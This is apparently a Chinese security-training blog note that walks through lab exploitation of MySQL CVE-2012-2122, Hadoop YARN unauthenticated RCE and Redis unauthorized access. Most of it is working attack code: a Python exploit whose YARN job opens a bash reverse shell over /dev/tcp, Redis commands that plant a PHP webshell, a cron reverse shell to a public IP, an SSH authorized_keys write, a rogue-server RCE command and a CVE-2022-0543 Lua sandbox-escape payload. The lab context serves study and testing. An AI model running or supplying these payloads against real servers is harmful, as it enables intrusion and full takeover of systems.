![1649287825147-11d6799d-5cca-4ae0-8ac6-5a564be2e3fb.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134010671-856274285.png)

```plain
#知识点：
1、服务攻防-数据库类型安全
2、Redis&Hadoop&Mysql安全
3、Mysql-CVE-2012-2122漏洞
4、Hadoop-配置不当未授权三重奏&RCE漏洞
3、Redis-配置不当未授权三重奏&RCE两漏洞

#章节内容：
常见服务应用的安全测试：
1、配置不当-未授权访问
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击

#前置知识：
应用服务安全测试流程：（有才能测试）见图
1、判断服务开放情况-端口扫描&组合应用等
2、判断服务类型归属-数据库&文件传输&通讯等
3、判断服务利用方式-特定漏洞&未授权&弱口令等

开了服务，但是端口没有：
1.内网 2.修改端口 3.防火墙waf
```

- Mysql-未授权访问-CVE-2012-2122利用

```plain
启动环境：
cd vulhub-master/mysql/CVE-2012-2122
sudo docker-compose up -d

复现环境：vulhub
参考：https://vulhub.org/#/environments/mysql/CVE-2012-2122/

先判断端口开放情况：3306

在kali中执行：for i in `seq 1 1000`; do mysql -uroot -pwrong -h 192.168.233.128 -P3306 ; done
```

![1649289655839-d01c6d8f-6840-4e11-80e5-ebbf3dd1a4ea.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134027993-1530338843.png)

```plain
mysql弱口令猜解账号密码需要满足一定的条件，因为mysql账号密码默认值允许本地登录（root）

mysql默认配置只允许本地登录root用户

远程的连接是拒绝的
mysql需要借助phpmyadmin猜解

phpmyadmin第三方的数据库管理应用，搭建在对方的服务器的
phpmyadmin登录mysql数据库，这个数据发送是由本地到本地的过程，所以可以进行测试
判断：inurl:phpmyadmin
```

- Hadoop-未授权访问-内置配合命令执行RCE

```plain
复现环境（在线靶场）：http://vulfocus.io/

Hadoop默认端口：50010

复现环境：https://vulhub.org/#/environments/hadoop/unauthorized-yarn/

启动环境：
cd /vulhub-master/hadoop/unauthorized-yarn
sudo docker-compose up -d

然后在网上找exp:https://www.cnblogs.com/cute-puli/p/14944637.html

访问网站：http://192.168.233.128:8088/cluster
import requests

target = 'http://192.168.233.128:8088/'
lhost = '192.168.233.131' # put your local host ip here, and listen at port 9999

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
执行exp：
G:\python38\python.exe hadoop.py
```

![1649291654137-2af95256-a535-4276-b319-58ec6563b15b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134028246-1704521958.png)

- Redis-未授权访问-Webshell&任务&密匙&RCE等

```plain
安装redis:

1、下载
wget http://download.redis.io/releases/redis-2.8.17.tar.gz

2、解压编译
tar xzvf redis-2.8.17.tar.gz  #解压安装包
cd redis-2.8.17  # 进入redis目录
make #编译

3、配置及启动
cd src/ #进入src目录 
cp redis-server /usr/bin/ 
cp redis-cli /usr/bin/      #将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）
cd ..   # 返回上一级目录
cp redis.conf /etc/     #将redis.conf拷贝到/etc/目录下
redis-server /etc/redis.conf  # 使用/etc/目录下的redis.conf文件中的配置启动redis服务
redis未授权访问：为什么会导致未授权访问？
在/etc/redis.config

1.# bind 127.0.0.1(如果开启的话，只允许本地用户访问)
2.protected-mode no（需要开启）
3.没有设置密码

本地搭建了，但是好像不支持连接
用到环境http://vulfocus.io/#/dashboard

连接数据库：redis-cli -h 175.178.151.29
1、写Webshell 需得到Web路径
利用条件：Web目录权限可读写
config set dir /tmp            #设置WEB写入目录tmp取代web目录
config set dbfilename 1.php    #设置写入文件名
set test "<?php phpinfo();?>"  #设置写入文件代码
bgsave                         #保存执行
save                           #保存执行
注意：部分没目录权限读写权限
```

![1649294995884-531f5917-f8f5-451d-ba79-e3cf872e9e4d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134028027-1904131148.png)

```plain
可以在服务器上看到1.php的存在
```

![1649295031610-a25d8215-0d8f-4849-a96a-8d376ff245da.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134028827-425827872.png)

```plain
2、写定时任务反弹shell
利用条件：
1.允许异地登录
2.安全模式protected-mode处于关闭状态

执行命令：
config set dir /var/spool/cron
set yy "\n\n\n* * * * * bash -i >& /dev/tcp/47.100.167.248/1111 0>&1\n\n\n"
config set dbfilename x
save
注意：
centos会忽略乱码去执行格式正确的任务计划 
而ubuntu并不会忽略这些乱码，所以导致命令执行失败

47.100.167.248执行：
nc -lvvp 1111

执行完后写入了文件
```

![1649295294162-bc1311fc-a6d5-43ad-a7b9-cdaf7c5f4853.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134028186-1625040472.png)

```plain
3、写入Linux ssh-key公钥
利用条件：
1.允许异地登录
2.Redis服务使用ROOT账号启动
3.安全模式protected-mode处于关闭状态
4.允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器

在kali主机中执行：
ssh-keygen -t rsa
cd /root/.ssh/
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
cat key.txt | redis-cli -h 175.178.151.29 -x set xxx

连接到175.178.151.29中执行：
redis-cli -h 175.178.151.29
config set dir /root/.ssh/
config set dbfilename authorized_keys
save

在kali中连接：
cd /root/.ssh/
ssh -i id_rsa root@175.178.151.29
4、RCE自动化利用脚本-vulfocus（需要版本4.x和5.x）
利用到工具：https://github.com/vulhub/redis-rogue-getshell
参考文章：https://vulhub.org/#/environments/redis/4-unacc/

上传到175.178.151.29服务器中，然后执行：
python redis-master.py -r 123.58.236.76 -p 56879 -L 47.100.167.248 -P 1111 -f RedisModulesSDK/exp.so -c "id"
```

![1649297884050-e2f409bf-6579-4acf-b6b8-934462513fd9.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134028197-1945325634.png)

```plain
5.新漏洞-沙箱绕过RCE CVE-2022-0543-vulfocus
参考：https://vulhub.org/#/environments/redis/CVE-2022-0543/

Poc：执行id命令
连接到redis，执行；
redis-cli -h 123.58.236.76 -p 8736
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

![1649298169261-e4697ba0-81a4-460d-8b14-41fec9106af1.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134028231-1221339842.png)